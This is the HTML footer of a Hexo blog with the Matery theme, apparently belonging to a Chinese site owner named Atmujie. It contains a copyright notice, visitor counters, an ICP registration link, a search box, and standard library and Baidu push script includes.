<script src="/libs/aplayer/APlayer.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>

    
    <div class="container row center-align" style="margin-bottom: 0px !important;">
        <div class="col s12 m8 l8 copy-right">
            Copyright&nbsp;&copy;
            <span id="year">2019</span>
            <a href="/about" target="_blank">Atmujie</a>
            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
            <br>
            
            
            
            
            
            
            <span id="busuanzi_container_site_pv">
                |&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
                    class="white-color"></span>&nbsp;次
            </span>
            
            
            <span id="busuanzi_container_site_uv">
                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
                    class="white-color"></span>&nbsp;人
            </span>
            
            <br>
            
            <br>
            
            <span id="icp"><img src="/medias/icp.png" style="vertical-align: text-bottom;" />
                <a href="https://beian.miit.gov.cn/" target="_blank">陇ICP备2022000869号</a>
            </span>
            
        </div>
        <div class="col s12 m4 l4 social-link social-statis">
    <a href="https://github.com/atmujie" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
        <i class="fab fa-github"></i>
    </a>















</div>
    </div>
</footer>

<div class="progress-bar"></div>


    <!-- 搜索遮罩框 -->
<div id="searchModal" class="modal">
    <div class="modal-content">
        <div class="search-header">
            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
                   class="search-input">
        </div>
        <div id="searchResult"></div>
    </div>
</div>

<script src="/js/search.js"></script>
<script type="text/javascript">
$(function () {
    searchFunc('/search.xml', 'searchInput', 'searchResult');
});
</script>

    <!-- 回到顶部按钮 -->
<div id="backTop" class="top-scroll">
    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
        <i class="fas fa-arrow-up"></i>
    </a>
</div>


    <script src="/libs/materialize/materialize.min.js"></script>
    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
    <script src="/libs/aos/aos.js"></script>
    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
    <script src="/js/matery.js"></script>

    <!-- Baidu Analytics -->

    <!-- Baidu Push -->

<script>
    (function () {
        var bp = document.createElement('script');
        var curProtocol = window.location.protocol.split(':')[0];
        if (curProtocol === 'https') {
            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
        } else {
            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
        }
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(bp, s);
    })();
</script>

    
    
    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
    

    

    

    

    

    

    
    <script src="/libs/instantpage/instantpage.js" type="module"></script>
    

</body>

</html>
